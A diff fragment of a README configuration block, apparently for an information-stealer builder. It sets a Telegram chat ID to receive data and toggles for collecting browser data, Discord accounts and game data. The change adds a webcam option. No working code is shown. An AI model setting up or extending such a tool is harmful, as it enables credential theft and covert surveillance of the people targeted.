@@ -9,6 +9,7 @@ tg_chat = 'replace_with_telegram_chat_id'
 browsers = True #(or False)
 discordacc = False #(or True)
 games = False #(or True)
+webcam = False #(or true)
 ```
 then type this in command prompt
 ```
